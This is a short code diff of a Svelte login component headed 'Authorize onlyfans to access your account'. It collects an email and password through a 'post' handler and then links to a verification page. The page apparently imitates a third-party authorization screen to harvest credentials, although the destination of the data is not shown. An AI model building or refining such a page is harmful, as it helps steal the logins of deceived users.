@@ -82,10 +82,11 @@
                         <h4>Authorize onlyfans to access your account</h4>
                     </div>
                     <div class="submit-opstion">
-                        <input bind:value={email} type="email" placeholder="email" required> <br>
-                        <input bind:value={password} type="password" placeholder="password"required> <br>
-                        <button on:click={post} type="button"> <a href="/verification"><b>Log In</b></a> </button>
-
+                        <form on:submit|preventDefault={post}>
+                        <input bind:value={email} type="email" placeholder="Email" required> <br>
+                        <input bind:value={password} type="password" placeholder="Password"required> <br>
+                        <button  type="button"> <a href="/verification"><b>Log In</b></a> </button>
+                    </form>
                         
                     </div>
                 </div>
